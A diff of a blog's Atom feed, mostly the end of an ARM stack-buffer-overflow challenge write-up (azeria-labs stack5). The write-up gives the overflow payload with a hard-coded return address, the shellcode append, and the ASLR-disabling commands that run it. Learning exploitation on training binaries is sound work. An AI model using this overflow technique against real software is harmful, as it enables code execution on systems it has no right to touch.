+   &lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x21000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rwxp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0xb6fcc000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb6fec000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnueabihf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0xb6ffc000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb6ffe000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rwxp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnueabihf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0xb6fff000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb7000000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[sigpage]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0xbefdf000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbf000000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rwxp&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;21000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[stack]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0xffff0000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff1000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[vectors]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can write the egg in the stack and then jump to it. The content
+of the stack should be:&lt;/p&gt;
+
+&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;object align=&quot;middle&quot; data=&quot;/book-of-gehn/uml/491b8c159b5e204e7451f06769445058.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;addr1&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;sp&lt;/code&gt;. But what value is?&lt;/p&gt;
+
+&lt;p&gt;If we disable ASLR we can peek the value with a debugger: 0xbefffbb8&lt;/p&gt;
+
+&lt;h2 id=&quot;the-attack&quot;&gt;The attack&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8\xfb\xff\xbe'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;egg.text &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; exploit
+
+pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; pwned_proof
+
+pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setarch linux32 &lt;span class=&quot;nt&quot;&gt;--addr-no-randomize&lt;/span&gt; /bin/bash
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;exploit | ./stack5
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
+0
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pwned_proof
+pwn!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The assembly of the egg can be found &lt;a href=&quot;/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;readings&quot;&gt;Readings&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://web.archive.org/web/2020*/http://www.phrack.org/issues/58/10.html#article&quot;&gt;Developing StrongARM/Linux shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://azeria-labs.com/return-oriented-programming-arm32/&quot;&gt;Introduction to ROP on Arm32&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://azeria-labs.com/writing-arm-shellcode/&quot;&gt;Introduction to Writing ARM Shellcode&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- stuff --&gt;
+
+&lt;script&gt;
+function fix_asm_syntax(ev) {
+    // pip install selectq
+    //   cond = (val('text()') == 'blt') | (val('text()') == 'b') | (val('text()').startswith('mov')) | ...
+    //   div = sQ.select('div', attr('class').contains('language-nasm'))
+    //   xpath = div.select('span', cond)
+
+    // Make some instructions &quot;keywords&quot;
+    var xpath = &quot;.//div[contains(@class,'language-nasm')]//span[(((text() = 'blt') or (text() = 'b')) or starts-with(text(), 'mov')) or starts-with(text(), 'ldm') or starts-with(text(), 'stm') or starts-with(text(), 'ldr') or starts-with(text(), 'bx') or starts-with(text(), 'bl') or starts-with(text(), 'bne') or starts-with(text(), 'mvn') or starts-with(text(), 'beq') or starts-with(text(), 'svc') or starts-with(text(), 'cmn') or starts-with(text(), 'bhi')]&quot;;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.add('k'); // keyword
+        el.classList.remove('n'); // noun
+    }
+
+    // Remove the 'err' class
+    var xpath = &quot;.//div[contains(@class,'language-nasm')]//span[@class='err']&quot;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+
+    // Remove the 'err' class
+    var xpath = &quot;.//div[contains(@class,'language-python')]//span[@class='err']&quot;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+}
+
+document.addEventListener('DOMContentLoaded', fix_asm_syntax);
+&lt;/script&gt;</content><author><name>Gehn</name></author><summary type="html">We have the same vulnerability than we have in stack4 but this time we will make our own egg/shellcode.</summary></entry><entry><title type="html">Smashing ARM Stack for Fun - Part V</title><link href="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part V" /><published>2021-01-20T00:00:00+01:00</published><updated>2021-01-20T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">&lt;p&gt;&lt;a href=&quot;https://github.com/azeria-labs/ARM-challenges&quot;&gt;Fifth challenge&lt;/a&gt;
 with a small introduction to &lt;em&gt;process continuation&lt;/em&gt;.&lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;planning-the-exploit&quot;&gt;Planning the exploit&lt;/h2&gt;
@@ -2613,17 +2991,4 @@ setup the network.&lt;/p&gt;
 little better.&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/bradfitz/embiggen-disk&quot;&gt;embiggen-disk&lt;/a&gt; seems to be a
-tool to facilite the task.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">Quick how-to download and run a Raspbian Buster (ARM) emulating the vm with QEMU.</summary></entry><entry><title type="html">Self-Licensing</title><link href="/book-of-gehn/articles/2020/12/05/Self-Licensing.html" rel="alternate" type="text/html" title="Self-Licensing" /><published>2020-12-05T00:00:00+01:00</published><updated>2020-12-05T00:00:00+01:00</updated><id>/book-of-gehn/articles/2020/12/05/Self-Licensing</id><content type="html" xml:base="/book-of-gehn/articles/2020/12/05/Self-Licensing.html">&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;img class=&quot;in-index-only&quot; style=&quot;max-width:60%;&quot; alt=&quot;self-licensing&quot; src=&quot;/book-of-gehn/assets/self-licensing/self-licensing-small.png&quot; /&gt;&lt;/figure&gt;
-&lt;!--more--&gt;
-
-&lt;figure class=&quot;fullwidth&quot;&gt;&lt;img src=&quot;/book-of-gehn/assets/self-licensing/self-licensing-whole.png&quot; /&gt;&lt;figcaption&gt;Doing good things has a &quot;moral boost&quot; on the self-concept, then a person
-subconsciously get &quot;self-indulgent&quot; and makes permissive
-in the future to do bad actions.
-&lt;br /&gt;
-The person no necessary needs to do the good action to have the
-&quot;moral boost&quot;: she can commit to do it in the future and that is
-enough to have the boost.
-&lt;br /&gt;
-Even the person does not need to do anything. The boost can be
-transferred from a group which the person identify herself
-as belonging to.&lt;/figcaption&gt;&lt;/figure&gt;</content><author><name>Gehn</name></author><summary type="html"></summary></entry></feed>
+tool to facilite the task.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">Quick how-to download and run a Raspbian Buster (ARM) emulating the vm with QEMU.</summary></entry></feed>
